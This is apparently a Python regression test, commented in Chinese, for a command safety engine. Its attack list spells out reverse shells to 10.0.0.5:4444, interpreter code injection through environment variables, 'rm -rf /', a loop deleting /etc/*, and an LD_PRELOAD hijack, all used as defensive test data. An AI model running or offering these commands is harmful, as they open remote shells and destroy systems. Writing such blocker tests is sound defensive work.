"""safety 引擎红队自查回归测试 (第十五轮, 2026-11-03, Gap-2026-11l)。

本文件固化 2026-11-03 新增的攻击面拦截规则, 防止回退:
1. 环境变量代码注入 (PYTHONSTARTUP / PYTHONPATH / NODE_OPTIONS --require / RUBYOPT -r /
   PERL5OPT -M / JAVA_OPTIONS -javaagent / ENV / GIT_SSH_COMMAND shell)。
2. 破坏循环 (for f in /etc/*; do rm -rf $f) 与 eval 循环 (while read; do eval $line)。
3. HIGH 确认级: PATH 劫持 (PATH 含 /tmp|/home 等可疑目录)。

同时覆盖: 常见良性命令 (SHELLOPTS / PATH=/usr/bin / 空环境变量 / zsh|fish --version /
ksh -c 'echo hello' / for 普通文件循环 / while read echo) 不得被误判 critical。
"""
from tuan_cli.ext.safety_engine import SafetyEngine, is_redline

_ENGINE = SafetyEngine()

_ATTACK = [
    # ---- ① 环境变量代码注入 ----
    "PYTHONSTARTUP=/tmp/evil.py python3",
    "ENV=/tmp/evil.sh sh",
    "PYTHONPATH=/tmp python3 -c 'import os; os.system(\"rm -rf /\")'",
    "NODE_OPTIONS='--require /tmp/evil.js' node",
    "RUBYOPT=-r/tmp/evil ruby",
    "PERL5OPT=-M/tmp/evil perl",
    "JDK_JAVA_OPTIONS='-javaagent:/tmp/evil.jar' java",
    "JAVA_TOOL_OPTIONS='-javaagent:/tmp/evil.jar' java",
    "GIT_SSH_COMMAND='sh -c \"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\"' git clone",
    # ---- ② 破坏循环 / eval 循环 ----
    "for f in /etc/*; do rm -rf $f; done",
    "while read -r line; do eval $line; done < /tmp/evil.txt",
    # ---- ③ 其他解释器反向 shell (既有/新增回归) ----
    "zsh -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'",
    "fish -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'",
    "ksh -c 'rm -rf /'",
    "tcsh -c 'rm -rf /'",
    "busybox sh -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'",
    # ---- ④ 既有规则回归 ----
    "LD_PRELOAD=/tmp/evil.so ls",
    "printf '%s\\n' 'rm -rf /' | while read c; do sh -c $c; done",
    "find / -name '*.conf' -exec sh -c 'rm -rf /' {} \\;",
]


def test_attack_payloads_blocked_critical():
    for cmd in _ATTACK:
        res = _ENGINE.score({"command": cmd})
        assert res["block"] is True, f"应 block=True: {cmd!r} -> {res}"
        assert res["risk"] == "critical", f"应 critical: {cmd!r} -> {res}"
        assert is_redline(cmd), f"is_redline 应命中: {cmd!r}"


# PATH 劫持: 确认旗标 (high), 不得 hard-block。
_CONFIRM = [
    "PATH=/tmp:/usr/bin bash",
    "PATH=/home/user/bin:/usr/bin bash",
    "env PATH=/tmp/x /bin/bash",
]


def test_confirm_level_not_critical():
    for cmd in _CONFIRM:
        res = _ENGINE.score({"command": cmd})
        assert res["risk"] != "critical", f"确认级不得 critical: {cmd!r} -> {res}"
        assert res["block"] is False, f"不应 block: {cmd!r} -> {res}"


_BENIGN = [
    # 正常环境/解释器
    "PYTHONSTARTUP= python3",
    "NODE_OPTIONS= node",
    "PATH=/usr/bin bash",
    "PATH=/usr/local/bin:/usr/bin bash",
    "SHELLOPTS=verbose sh",
    # 正常 shell 用法
    "zsh --version",
    "fish --version",
    "ksh -c 'echo hello'",
    "python3 --version",
    # 正常循环/管道
    "for f in *.txt; do echo $f; done",
    "while read -r line; do echo $line; done < file.txt",
    "xargs echo < file.txt",
    "awk '{print $1}' file.txt",
    "date",
]


def test_benign_commands_not_critical():
    for cmd in _BENIGN:
        res = _ENGINE.score({"command": cmd})
        assert res["risk"] != "critical", f"良性命令不得 critical: {cmd!r} -> {res}"
        assert res["block"] is False, f"不应 block: {cmd!r} -> {res}"
